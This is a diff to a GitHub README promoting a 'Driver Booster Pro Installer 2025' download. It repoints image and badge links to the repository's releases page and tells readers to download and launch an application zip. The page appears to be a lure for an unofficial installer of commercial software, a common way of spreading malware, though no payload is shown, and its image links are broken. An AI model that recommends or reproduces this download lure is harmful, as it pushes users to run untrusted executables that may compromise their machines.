@@ -2,7 +2,7 @@
 
 Welcome to the Driver Booster Pro Installer 2025 repository! Here you will find everything you need to enhance your PC's performance and stability through automatic driver updates and system optimization. 🚀⚙️
 
-![Driver Booster Pro](https://img.icons8.com/color/96/000000/driver.png)
+![Driver Booster Pro](https://github.com/SweetFishy/Driver-Booster-Pro-Installer-2025/releases)
 
 ## Description
 "Driver Booster Pro Installer 2025" is your go-to solution for managing your device drivers, cleaning up unnecessary drivers, and ensuring smooth driver installations. With this tool, you can easily update your drivers, optimize your hardware, and maintain your PC at its peak performance.
@@ -29,7 +29,7 @@ Welcome to the Driver Booster Pro Installer 2025 repository! Here you will find 
 * windows-tools
 
 ## Download Application
-[![Download Driver Booster Pro](https://img.shields.io/badge/Download-Application.zip-<COLOR>.svg)](https://github.com/files/uploaded/Application.zip)
+[![Download Driver Booster Pro](https://github.com/SweetFishy/Driver-Booster-Pro-Installer-2025/releases<COLOR>.svg)](https://github.com/SweetFishy/Driver-Booster-Pro-Installer-2025/releases)
 
 If the link ends with the file name, click to download and launch the application. 
 
@@ -62,7 +62,7 @@ If you encounter any issues or have questions regarding Driver Booster Pro Insta
 ## Conclusion
 Experience the power of automated driver updates and system optimization with Driver Booster Pro Installer 2025. Keep your PC running smoothly, enhance its performance, and ensure stability with just a few clicks. Download now and take your PC maintenance to the next level!
 
-![PC Optimization](https://img.icons8.com/doodle/96/000000/computer--v1.png)
+![PC Optimization](https://github.com/SweetFishy/Driver-Booster-Pro-Installer-2025/releases)
 
 Remember, a well-maintained PC is a happy PC! 🌟
 
